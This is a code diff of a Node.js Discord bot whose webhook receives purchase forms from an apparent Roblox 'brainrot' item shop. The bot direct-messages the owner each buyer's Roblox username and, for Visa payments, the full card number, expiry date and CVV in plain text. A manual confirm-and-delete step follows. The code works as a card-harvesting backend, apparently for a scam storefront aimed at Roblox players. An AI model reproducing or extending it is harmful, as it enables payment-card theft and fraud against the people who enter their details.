@@ -5,7 +5,7 @@ const bodyParser = require('body-parser');
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
-    GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.DirectMessages,     // Important for DMs
     GatewayIntentBits.MessageContent,
   ]
 });
@@ -13,60 +13,47 @@ const client = new Client({
 const app = express();
 app.use(bodyParser.json());
 
-const OWNER_ID = '1280339014033080442';   // Your Discord ID
+const OWNER_ID = '1280339014033080442';
 
-// ====================== YOUR STORE URL HERE ======================
-const STORE_URL = 'https://obsidianx-shop.up.railway.app/';   // ← CHANGE THIS!
-// =================================================================
+// CHANGE THIS TO YOUR ACTUAL STORE URL FROM RAILWAY
+const STORE_URL = 'https://obsidianx-shop.up.railway.app';   // ←←← UPDATE THIS
 
 client.once('ready', () => {
-  console.log(`✅ Bot is online as ${client.user.tag}`);
-  // Optional: DM you when bot starts
-  client.users.fetch(OWNER_ID).then(user => {
-    user.send('**✅ ObsidianX Bot is now online and ready!**').catch(console.error);
-  });
+  console.log(`✅ Bot online as ${client.user.tag}`);
 });
 
-// Webhook from website
 app.post('/purchase-complete', async (req, res) => {
-  const payload = req.body || {};
-  const { name, username, receipt, paymentType, cardDetails, proof } = payload;
+  const data = req.body || {};
+  const { name = 'Unknown', receipt, username, paymentType, cardDetails } = data;
 
-  console.log('📩 New purchase received:', payload);
+  console.log('📩 Purchase received:', data);
 
   const embed = new EmbedBuilder()
-    .setColor('#ff4d4d')
-    .setTitle('🛒 New Purchase Attempt')
-    .setDescription(`**Someone has just looked into buying the ${name || 'Unknown'}**\n\nThey have purchased. Confirm if the payment works.`)
+    .setColor(0xff4d4d)
+    .setTitle('🛒 New Brainrot Purchase')
+    .setDescription(`Someone has just looked into buying **${name}** and completed the form.\n\nConfirm if the payment went through.`)
     .addFields(
       { name: 'Receipt', value: receipt || 'N/A', inline: true },
       { name: 'Roblox Username', value: username || 'Unknown', inline: true },
-      { name: 'Payment Method', value: paymentType === 'robux' ? 'Robux' : 'Visa Prepaid', inline: true },
-      { name: 'Proof', value: proof ? 'Screenshot attached (check console for base64 if needed)' : 'No proof', inline: false }
+      { name: 'Payment', value: paymentType === 'robux' ? 'Robux' : 'Visa Prepaid', inline: true }
     )
     .setTimestamp();
 
   if (paymentType === 'visa' && cardDetails) {
-    embed.addFields({ name: 'Card Details', value: `Card: ${cardDetails.cardNumber || 'N/A'}\nExpiry: ${cardDetails.expiry || 'N/A'}\nCVV: ${cardDetails.cvv || 'N/A'}`, inline: false });
+    embed.addFields({ name: 'Card Info', value: `Card: ${cardDetails.cardNumber || 'N/A'}\nExpiry: ${cardDetails.expiry || 'N/A'}\nCVV: ${cardDetails.cvv || 'N/A'}`, inline: false });
   }
 
   const row = new ActionRowBuilder().addComponents(
-    new ButtonBuilder()
-      .setCustomId(`confirm_${payload.id}`)
-      .setLabel('✅ Confirm')
-      .setStyle(ButtonStyle.Success),
-    new ButtonBuilder()
-      .setCustomId(`decline_${payload.id}`)
-      .setLabel('❌ Decline')
-      .setStyle(ButtonStyle.Danger)
+    new ButtonBuilder().setCustomId(`confirm_${data.id || 'unknown'}`).setLabel('✅ Confirm & Delete').setStyle(ButtonStyle.Success),
+    new ButtonBuilder().setCustomId(`decline_${data.id || 'unknown'}`).setLabel('❌ Decline').setStyle(ButtonStyle.Danger)
   );
 
   try {
     const user = await client.users.fetch(OWNER_ID);
     await user.send({ embeds: [embed], components: [row] });
-    console.log('✅ DM with buttons sent to owner');
-  } catch (e) {
-    console.error('❌ Failed to send DM:', e);
+    console.log('✅ DM with buttons sent successfully');
+  } catch (err) {
+    console.error('❌ Failed to send DM:', err.message);
   }
 
   res.json({ success: true });
@@ -82,32 +69,29 @@ client.on('interactionCreate', async interaction => {
     try {
       await fetch(`${STORE_URL}/delete/${itemId}`, { method: 'DELETE' });
       await interaction.update({
-        content: `✅ **Purchase confirmed!** Brainrot #${itemId} has been **deleted** from the store.`,
+        content: `✅ Confirmed! Brainrot has been **deleted** from the store.`,
         components: []
       });
-      console.log(`✅ Confirmed and deleted item ${itemId}`);
     } catch (e) {
-      await interaction.update({ content: '❌ Failed to delete from store.', components: [] });
+      await interaction.update({ content: '❌ Failed to delete item from store.', components: [] });
     }
   } else if (action === 'decline') {
     await interaction.update({
-      content: `❌ Purchase declined for item #${itemId}.`,
+      content: `❌ Purchase declined.`,
       components: []
     });
   }
 });
 
-// Login
 const TOKEN = process.env.DISCORD_TOKEN;
 if (!TOKEN) {
-  console.error("❌ DISCORD_TOKEN is missing!");
+  console.error("❌ DISCORD_TOKEN missing in Railway variables!");
   process.exit(1);
 }
 
 client.login(TOKEN).catch(e => {
   console.error("❌ Login failed:", e.message);
-  process.exit(1);
 });
 
 const PORT = process.env.PORT || 3001;
-app.listen(PORT, () => console.log(`🚀 Bot webhook running on port ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Webhook listening on port ${PORT}`));
